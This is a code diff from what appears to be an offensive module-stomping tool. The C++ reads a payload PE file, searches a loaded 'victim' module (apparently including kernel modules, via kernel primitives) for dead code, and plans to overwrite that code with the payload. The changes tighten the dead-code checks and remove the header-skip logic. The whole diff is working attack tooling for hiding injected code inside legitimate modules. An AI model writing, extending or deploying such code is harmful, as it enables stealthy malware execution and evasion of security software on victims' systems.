@@ -1567,8 +1567,9 @@ static int ExecuteStompDryRunUserOnly(const char* payloadPath)
     }
     StompProgress("DEAD_CODE_SCAN");
     if (!stomp::AnalyzeDeadCode(vic)) {
-        Log("[*] stomp no unreferenced CC-regions in %ls (placement uses exec gap)\n",
-            vic.name.c_str());
+        Log("[!] stomp no xref-proofed dead code in %ls (dead_funcs=%zu)\n",
+            vic.name.c_str(), vic.dead_funcs.size());
+        return 2;
     }
     std::vector<uint8_t> payloadFile = ReadFileBin(payloadPath);
     if (payloadFile.empty()) {
@@ -1576,18 +1577,16 @@ static int ExecuteStompDryRunUserOnly(const char* payloadPath)
         return 1;
     }
     uint32_t sizeOfImage = stomp::PeSizeOfImage(payloadFile);
-    uint32_t skip = stomp::PeFirstSectionRva(payloadFile);
-    if (!sizeOfImage || !skip || skip >= sizeOfImage) {
+    if (!sizeOfImage) {
         Log("[!] stomp invalid payload PE\n");
         return 2;
     }
     stomp::StompPlan plan{};
     plan.victim_name = vic.name;
     plan.victim_base = vic.loaded_base;
-    plan.header_skip = skip;
-    if (!stomp::PlanPlacement(vic, sizeOfImage - skip, plan)) {
-        Log("[!] stomp PlanPlacement failed need span=0x%x image=0x%x dead=%zu text=0x%x\n",
-            sizeOfImage - skip, sizeOfImage, vic.dead_funcs.size(), vic.text_vsize);
+    if (!stomp::PlanPlacement(vic, sizeOfImage, plan)) {
+        Log("[!] stomp PlanPlacement failed need SizeOfImage=0x%x dead=%zu text=0x%x\n",
+            sizeOfImage, vic.dead_funcs.size(), vic.text_vsize);
         return 2;
     }
     std::wstring modName, dosName;
@@ -1621,8 +1620,9 @@ static int ExecuteStompMode(KernelPrimitives& prim, uint64_t kernelBase, const c
     }
     StompProgress("ENUMERATE");
     if (!stomp::AnalyzeDeadCode(vic)) {
-        Log("[*] stomp no unreferenced CC-regions in %ls (placement uses exec gap)\n",
-            modName.c_str());
+        Log("[!] stomp no xref-proofed dead code in %ls (dead_funcs=%zu)\n",
+            modName.c_str(), vic.dead_funcs.size());
+        return 2;
     }
     StompProgress("DEAD_CODE_SCAN");
     std::vector<uint8_t> payloadFile = ReadFileBin(payloadPath);
@@ -1631,8 +1631,7 @@ static int ExecuteStompMode(KernelPrimitives& prim, uint64_t kernelBase, const c
         return 1;
     }
     uint32_t sizeOfImage = stomp::PeSizeOfImage(payloadFile);
-    uint32_t skip = stomp::PeFirstSectionRva(payloadFile);
-    if (!sizeOfImage || !skip || skip >= sizeOfImage) {
+    if (!sizeOfImage) {
         Log("[!] stomp invalid payload PE\n");
         return 2;
     }
@@ -1640,8 +1639,7 @@ static int ExecuteStompMode(KernelPrimitives& prim, uint64_t kernelBase, const c
     plan.victim_name = vic.name;
     plan.victim_dos_name = dosName;
     plan.victim_base = vic.loaded_base;
-    plan.header_skip = skip;
-    if (!stomp::PlanPlacement(vic, sizeOfImage - skip, plan)) {
+    if (!stomp::PlanPlacement(vic, sizeOfImage, plan)) {
         Log("[!] stomp PlanPlacement failed need SizeOfImage=0x%x dead=%zu\n",
             sizeOfImage, vic.dead_funcs.size());
         return 2;
